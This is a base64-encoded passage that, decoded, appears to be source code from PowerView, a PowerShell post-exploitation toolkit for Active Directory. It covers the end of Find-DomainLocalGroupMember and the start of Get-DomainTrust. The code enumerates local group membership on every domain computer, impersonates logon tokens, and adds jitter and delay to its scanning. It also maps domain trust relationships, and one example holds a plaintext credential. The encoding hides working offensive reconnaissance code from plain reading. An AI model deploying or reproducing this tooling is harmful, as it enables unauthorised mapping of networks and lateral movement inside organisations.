vdW5kUGFyYW1ldGVyc1snVW5jb25zdHJhaW5lZCddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydVbmNvbnN0cmFpbmVkJ10gPSAkVW5jb25zdHJhaW5lZCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0nXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snT3BlcmF0aW5nU3lzdGVtJ10gPSAkT3BlcmF0aW5nU3lzdGVtIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlclNlcnZpY2VQYWNrJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZpY2VQYWNrJ10gPSAkU2VydmljZVBhY2sgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyU2l0ZU5hbWUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2l0ZU5hbWUnXSA9ICRTaXRlTmFtZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CgogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyTmFtZSddKSB7CiAgICAgICAgICAgICRUYXJnZXRDb21wdXRlcnMgPSAkQ29tcHV0ZXJOYW1lCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdbRmluZC1Eb21haW5Mb2NhbEdyb3VwTWVtYmVyXSBRdWVyeWluZyBjb21wdXRlcnMgaW4gdGhlIGRvbWFpbicKICAgICAgICAgICAgJFRhcmdldENvbXB1dGVycyA9IEdldC1Eb21haW5Db21wdXRlciBAQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50cyB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IGRuc2hvc3RuYW1lCiAgICAgICAgfQogICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpbkxvY2FsR3JvdXBNZW1iZXJdIFRhcmdldENvbXB1dGVycyBsZW5ndGg6ICQoJFRhcmdldENvbXB1dGVycy5MZW5ndGgpIgogICAgICAgIGlmICgkVGFyZ2V0Q29tcHV0ZXJzLkxlbmd0aCAtZXEgMCkgewogICAgICAgICAgICB0aHJvdyAnW0ZpbmQtRG9tYWluTG9jYWxHcm91cE1lbWJlcl0gTm8gaG9zdHMgZm91bmQgdG8gZW51bWVyYXRlJwogICAgICAgIH0KCiAgICAgICAgIyB0aGUgaG9zdCBlbnVtZXJhdGlvbiBibG9jayB3ZSdyZSB1c2luZyB0byBlbnVtZXJhdGUgYWxsIHNlcnZlcnMKICAgICAgICAkSG9zdEVudW1CbG9jayA9IHsKICAgICAgICAgICAgUGFyYW0oJENvbXB1dGVyTmFtZSwgJEdyb3VwTmFtZSwgJE1ldGhvZCwgJFRva2VuSGFuZGxlKQoKICAgICAgICAgICAgaWYgKCRUb2tlbkhhbmRsZSkgewogICAgICAgICAgICAgICAgIyBpbXBlcnNvbmF0ZSB0aGUgdGhlIHRva2VuIHByb2R1Y2VkIGJ5IExvZ29uVXNlcigpL0ludm9rZS1Vc2VySW1wZXJzb25hdGlvbgogICAgICAgICAgICAgICAgJE51bGwgPSBJbnZva2UtVXNlckltcGVyc29uYXRpb24gLVRva2VuSGFuZGxlICRUb2tlbkhhbmRsZSAtUXVpZXQKICAgICAgICAgICAgfQoKICAgICAgICAgICAgRm9yRWFjaCAoJFRhcmdldENvbXB1dGVyIGluICRDb21wdXRlck5hbWUpIHsKICAgICAgICAgICAgICAgICRVcCA9IFRlc3QtQ29ubmVjdGlvbiAtQ291bnQgMSAtUXVpZXQgLUNvbXB1dGVyTmFtZSAkVGFyZ2V0Q29tcHV0ZXIKICAgICAgICAgICAgICAgIGlmICgkVXApIHsKICAgICAgICAgICAgICAgICAgICAkTmV0TG9jYWxHcm91cE1lbWJlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICAgICAgICAgICAgICdDb21wdXRlck5hbWUnID0gJFRhcmdldENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgICAgICdNZXRob2QnID0gJE1ldGhvZAogICAgICAgICAgICAgICAgICAgICAgICAnR3JvdXBOYW1lJyA9ICRHcm91cE5hbWUKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgR2V0LU5ldExvY2FsR3JvdXBNZW1iZXIgQE5ldExvY2FsR3JvdXBNZW1iZXJBcmd1bWVudHMKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYgKCRUb2tlbkhhbmRsZSkgewogICAgICAgICAgICAgICAgSW52b2tlLVJldmVydFRvU2VsZgogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICAkTG9nb25Ub2tlbiA9ICROdWxsCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RlbGF5J10gLW9yICRQU0JvdW5kUGFyYW1ldGVyc1snU3RvcE9uU3VjY2VzcyddKSB7CiAgICAgICAgICAgICAgICAkTG9nb25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJExvZ29uVG9rZW4gPSBJbnZva2UtVXNlckltcGVyc29uYXRpb24gLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwgLVF1aWV0CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgIyBvbmx5IGlnbm9yZSB0aHJlYWRpbmcgaWYgLURlbGF5IGlzIHBhc3NlZAogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RlbGF5J10gLW9yICRQU0JvdW5kUGFyYW1ldGVyc1snU3RvcE9uU3VjY2VzcyddKSB7CgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5Mb2NhbEdyb3VwTWVtYmVyXSBUb3RhbCBudW1iZXIgb2YgaG9zdHM6ICQoJFRhcmdldENvbXB1dGVycy5jb3VudCkiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpbkxvY2FsR3JvdXBNZW1iZXJdIERlbGF5OiAkRGVsYXksIEppdHRlcjogJEppdHRlciIKICAgICAgICAgICAgJENvdW50ZXIgPSAwCiAgICAgICAgICAgICRSYW5kTm8gPSBOZXctT2JqZWN0IFN5c3RlbS5SYW5kb20KCiAgICAgICAgICAgIEZvckVhY2ggKCRUYXJnZXRDb21wdXRlciBpbiAkVGFyZ2V0Q29tcHV0ZXJzKSB7CiAgICAgICAgICAgICAgICAkQ291bnRlciA9ICRDb3VudGVyICsgMQoKICAgICAgICAgICAgICAgICMgc2xlZXAgZm9yIG91ciBzZW1pLXJhbmRvbWl6ZWQgaW50ZXJ2YWwKICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzICRSYW5kTm8uTmV4dCgoMS0kSml0dGVyKSokRGVsYXksICgxKyRKaXR0ZXIpKiREZWxheSkKCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5Mb2NhbEdyb3VwTWVtYmVyXSBFbnVtZXJhdGluZyBzZXJ2ZXIgJFRhcmdldENvbXB1dGVyICgkQ291bnRlciBvZiAkKCRUYXJnZXRDb21wdXRlcnMuY291bnQpKSIKICAgICAgICAgICAgICAgIEludm9rZS1Db21tYW5kIC1TY3JpcHRCbG9jayAkSG9zdEVudW1CbG9jayAtQXJndW1lbnRMaXN0ICRUYXJnZXRDb21wdXRlciwgJEdyb3VwTmFtZSwgJE1ldGhvZCwgJExvZ29uVG9rZW4KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluTG9jYWxHcm91cE1lbWJlcl0gVXNpbmcgdGhyZWFkaW5nIHdpdGggdGhyZWFkczogJFRocmVhZHMiCgogICAgICAgICAgICAjIGlmIHdlJ3JlIHVzaW5nIHRocmVhZGluZywga2ljayBvZmYgdGhlIHNjcmlwdCBibG9jayB3aXRoIE5ldy1UaHJlYWRlZEZ1bmN0aW9uCiAgICAgICAgICAgICRTY3JpcHRQYXJhbXMgPSBAewogICAgICAgICAgICAgICAgJ0dyb3VwTmFtZScgPSAkR3JvdXBOYW1lCiAgICAgICAgICAgICAgICAnTWV0aG9kJyA9ICRNZXRob2QKICAgICAgICAgICAgICAgICdUb2tlbkhhbmRsZScgPSAkTG9nb25Ub2tlbgogICAgICAgICAgICB9CgogICAgICAgICAgICAjIGlmIHdlJ3JlIHVzaW5nIHRocmVhZGluZywga2ljayBvZmYgdGhlIHNjcmlwdCBibG9jayB3aXRoIE5ldy1UaHJlYWRlZEZ1bmN0aW9uIHVzaW5nIHRoZSAkSG9zdEVudW1CbG9jayArIHBhcmFtcwogICAgICAgICAgICBOZXctVGhyZWFkZWRGdW5jdGlvbiAtQ29tcHV0ZXJOYW1lICRUYXJnZXRDb21wdXRlcnMgLVNjcmlwdEJsb2NrICRIb3N0RW51bUJsb2NrIC1TY3JpcHRQYXJhbWV0ZXJzICRTY3JpcHRQYXJhbXMgLVRocmVhZHMgJFRocmVhZHMKICAgICAgICB9CiAgICB9CgogICAgRU5EIHsKICAgICAgICBpZiAoJExvZ29uVG9rZW4pIHsKICAgICAgICAgICAgSW52b2tlLVJldmVydFRvU2VsZiAtVG9rZW5IYW5kbGUgJExvZ29uVG9rZW4KICAgICAgICB9CiAgICB9Cn0KCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojCiMgRG9tYWluIHRydXN0IGZ1bmN0aW9ucyBiZWxvdy4KIwojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKZnVuY3Rpb24gR2V0LURvbWFpblRydXN0IHsKPCMKLlNZTk9QU0lTCgpSZXR1cm4gYWxsIGRvbWFpbiB0cnVzdHMgZm9yIHRoZSBjdXJyZW50IGRvbWFpbiBvciBhIHNwZWNpZmllZCBkb21haW4uCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEdldC1Eb21haW4sIEdldC1Eb21haW5TZWFyY2hlciwgR2V0LURvbWFpblNJRCwgUFNSZWZsZWN0ICAKCi5ERVNDUklQVElPTgoKVGhpcyBmdW5jdGlvbiB3aWxsIGVudW1lcmF0ZSBkb21haW4gdHJ1c3QgcmVsYXRpb25zaGlwcyBmb3IgdGhlIGN1cnJlbnQgKG9yIGEgcmVtb3RlKQpkb21haW4gdXNpbmcgYSBudW1iZXIgb2YgbWV0aG9kcy4gQnkgZGVmYXVsdCwgdGhlIC5ORVQgbWV0aG9kIEdldEFsbFRydXN0UmVsYXRpb25zaGlwcygpCmlzIHVzZWQgb24gdGhlIFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRG9tYWluIG9iamVjdC4gSWYgdGhlIC1MREFQIGZsYWcKaXMgc3BlY2lmaWVkLCBvciBhbnkgb2YgdGhlIExEQVAtYXBwcm9wcmlhdGUgcGFyYW1ldGVycywgYW4gTERBUCBzZWFyY2ggdXNpbmcgdGhlIGZpbHRlcgonKG9iamVjdENsYXNzPXRydXN0ZWREb21haW4pJyBpcyB1c2VkIGluc3RlYWQuIElmIHRoZSAtQVBJIGZsYWcgaXMgc3BlY2lmaWVkLCB0aGUKV2luMzIgQVBJIERzRW51bWVyYXRlRG9tYWluVHJ1c3RzKCkgY2FsbCBpcyB1c2VkIHRvIGVudW1lcmF0ZSBpbnN0ZWFkLgoKLlBBUkFNRVRFUiBEb21haW4KClNwZWNpZmllcyB0aGUgZG9tYWluIHRvIHF1ZXJ5IGZvciB0cnVzdHMsIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgQVBJCgpTd2l0Y2guIFVzZSBhbiBBUEkgY2FsbCAoRHNFbnVtZXJhdGVEb21haW5UcnVzdHMpIHRvIGVudW1lcmF0ZSB0aGUgdHJ1c3RzIGluc3RlYWQgb2YgdGhlIGJ1aWx0LWluCi5ORVQgbWV0aG9kcy4KCi5QQVJBTUVURVIgTERBUAoKU3dpdGNoLiBVc2UgTERBUCBxdWVyaWVzIHRvIGVudW1lcmF0ZSB0aGUgdHJ1c3RzIGluc3RlYWQgb2YgZGlyZWN0IGRvbWFpbiBjb25uZWN0aW9ucy4KCi5QQVJBTUVURVIgTERBUEZpbHRlcgoKU3BlY2lmaWVzIGFuIExEQVAgcXVlcnkgc3RyaW5nIHRoYXQgaXMgdXNlZCB0byBmaWx0ZXIgQWN0aXZlIERpcmVjdG9yeSBvYmplY3RzLgoKLlBBUkFNRVRFUiBQcm9wZXJ0aWVzCgpTcGVjaWZpZXMgdGhlIHByb3BlcnRpZXMgb2YgdGhlIG91dHB1dCBvYmplY3QgdG8gcmV0cmlldmUgZnJvbSB0aGUgc2VydmVyLgoKLlBBUkFNRVRFUiBTZWFyY2hCYXNlCgpUaGUgTERBUCBzb3VyY2UgdG8gc2VhcmNoIHRocm91Z2gsIGUuZy4gIkxEQVA6Ly9PVT1zZWNyZXQsREM9dGVzdGxhYixEQz1sb2NhbCIKVXNlZnVsIGZvciBPVSBxdWVyaWVzLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8uCgouUEFSQU1FVEVSIFNlYXJjaFNjb3BlCgpTcGVjaWZpZXMgdGhlIHNjb3BlIHRvIHNlYXJjaCB1bmRlciwgQmFzZS9PbmVMZXZlbC9TdWJ0cmVlIChkZWZhdWx0IG9mIFN1YnRyZWUpLgoKLlBBUkFNRVRFUiBSZXN1bHRQYWdlU2l6ZQoKU3BlY2lmaWVzIHRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4KCi5QQVJBTUVURVIgU2VydmVyVGltZUxpbWl0CgpTcGVjaWZpZXMgdGhlIG1heGltdW0gYW1vdW50IG9mIHRpbWUgdGhlIHNlcnZlciBzcGVuZHMgc2VhcmNoaW5nLiBEZWZhdWx0IG9mIDEyMCBzZWNvbmRzLgoKLlBBUkFNRVRFUiBUb21ic3RvbmUKClN3aXRjaC4gU3BlY2lmaWVzIHRoYXQgdGhlIHNlYXJjaGVyIHNob3VsZCBhbHNvIHJldHVybiBkZWxldGVkL3RvbWJzdG9uZWQgb2JqZWN0cy4KCi5QQVJBTUVURVIgRmluZE9uZQoKT25seSByZXR1cm4gb25lIHJlc3VsdCBvYmplY3QuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouRVhBTVBMRQoKR2V0LURvbWFpblRydXN0CgpSZXR1cm4gZG9tYWluIHRydXN0cyBmb3IgdGhlIGN1cnJlbnQgZG9tYWluIHVzaW5nIGJ1aWx0IGluIC5ORVQgbWV0aG9kcy4KCi5FWEFNUExFCgpHZXQtRG9tYWluVHJ1c3QgLURvbWFpbiAicHJvZC50ZXN0bGFiLmxvY2FsIgoKUmV0dXJuIGRvbWFpbiB0cnVzdHMgZm9yIHRoZSAicHJvZC50ZXN0bGFiLmxvY2FsIiBkb21haW4gdXNpbmcgLk5FVCBtZXRob2RzCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKR2V0LURvbWFpblRydXN0IC1MREFQIC1Eb21haW4gInByb2QudGVzdGxhYi5sb2NhbCIgLVNlcnZlciAiUFJJTUFSWS50ZXN0bGFiLmxvY2FsIiAtQ3JlZGVudGlhbCAkQ3JlZAoKUmV0dXJuIGRvbWFpbiB0cnVzdHMgZm9yIHRoZSAicHJvZC50ZXN0bGFiLmxvY2FsIiBkb21haW4gZW51bWVyYXRlZCB0aHJvdWdoIExEQVAKcXVlcmllcywgYmluZGluZyB0byB0aGUgUFJJTUFSWS50ZXN0bGFiLmxvY2FsIHNlcnZlciBmb3IgcXVlcmllcywgYW5kIHVzaW5nIHRoZSBzcGVjaWZpZWQKYWx0ZXJuYXRlIGNyZWRlbml0YWxzLgoKLkVYQU1QTEUKCkdldC1Eb21haW5UcnVzdCAtQVBJIC1Eb21haW4gInByb2QudGVzdGxhYi5sb2NhbCIKClJldHVybiBkb21haW4gdHJ1c3RzIGZvciB0aGUgInByb2QudGVzdGxhYi5sb2NhbCIgZG9tYWluIGVudW1lcmF0ZWQgdGhyb3VnaCBBUEkgY2FsbHMuCgouT1VUUFVUUwoKUG93ZXJWaWV3LkRvbWFpblRydXN0Lk5FVAoKQSBUcnVzdFJlbGF0aW9uc2hpcEluZm9ybWF0aW9uQ29sbGVjdGlvbiByZXR1cm5lZCB3aGVuIHVzaW5nIC5ORVQgbWV0aG9kcyAoZGVmYXVsdCkuCgpQb3dlclZpZXcuRG9tYWluVHJ1c3QuTERBUAoKQ3VzdG9tIFBTT2JqZWN0IHdpdGggdHJhbnNsYXRlZCBkb21haW4gTERBUCB0cnVzdCByZXN1bHQgZmllbGRzLgoKUG93ZXJWaWV3LkRvbWFpblRydXN0LkFQSQoKQ3VzdG9tIFBTT2JqZWN0IHdpdGggdHJhbnNsYXRlZCBkb21haW4gQVBJIHRydXN0IHJlc3VsdCBmaWVsZHMuCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuRG9tYWluVHJ1c3QuTkVUJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkRvbWFpblRydXN0LkxEQVAnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuRG9tYWluVHJ1c3QuQVBJJyldCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZSA9ICdORVQnKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnTmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnQVBJJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkQVBJLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnTERBUCcpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJExEQVAsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdMREFQJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0ZpbHRlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJExEQVBGaWx0ZXIsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdMREFQJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFByb3BlcnRpZXMsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdMREFQJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnTERBUCcpXQogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdBUEknKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0xEQVAnKV0KICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnTERBUCcpXQogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0xEQVAnKV0KICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnTERBUCcpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKCiAgICAgICAgW0FsaWFzKCdSZXR1cm5PbmUnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRGaW5kT25lLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnTERBUCcpXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkVHJ1c3RBdHRyaWJ1dGVzID0gQHsKICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDAwMScgPSAnbm9uX3RyYW5zaXRpdmUnCiAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMDAwMDInID0gJ3VwbGV2ZWxfb25seScKICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDAwNCcgPSAncXVhcmFudGluZWRfZG9tYWluJwogICAgICAgICAgICBbdWludDMyXScweDAwMDAwMDA4JyA9ICdmb3Jlc3RfdHJhbnNpdGl2ZScKICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDAxMCcgPSAnY3Jvc3Nfb3JnYW5pemF0aW9uJwogICAgICAgICAgICBbdWludDMyXScweDAwMDAwMDIwJyA9ICd3aXRoaW5fZm9yZXN0JwogICAgICAgICAgICBbdWludDMyXScweDAwMDAwMDQwJyA9ICd0cmVhdF9hc19leHRlcm5hbCcKICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDA4MCcgPSAndHJ1c3RfdXNlc19yYzRfZW5jcnlwdGlvbicKICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDEwMCcgPSAndHJ1c3RfdXNlc19hZXNfa2V5cycKICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDIwMCcgPSAnY3Jvc3Nfb3JnYW5pemF0aW9uX25vX3RndF9kZWxlZ2F0aW9uJwogICAgICAgICAgICBbdWludDMyXScweDAwMDAwNDAwJyA9ICdwaW1fdHJ1c3QnCiAgICAgICAgfQoKICAgICAgICAkTGRhcFNlYXJjaGVyQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snTERBUEZpbHRlciddKSB7ICRMZGFwU2VhcmNoZXJBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICRMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydQcm9wZXJ0aWVzJ10pIHsgJExkYXBTZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddID0gJFByb3BlcnRpZXMgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkTGRhcFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJExkYXBTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRMZGFwU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJExkYXBTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJExkYXBTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkTGRhcFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkTGRhcFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRQc0NtZGxldC5QYXJhbWV0ZXJTZXROYW1lIC1uZSAnQVBJJykgewogICAgICAgICAgICAkTmV0U2VhcmNoZXJBcmd1bWVudHMgPSBAe30KICAgICAgICAgICAgaWYgKCREb21haW4gLWFuZCAkRG9tYWluLlRyaW0oKSAtbmUgJycpIHsKICAgICAgICAgICAgICAgICRTb3VyY2VEb21haW4gPSAkRG9tYWluCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgI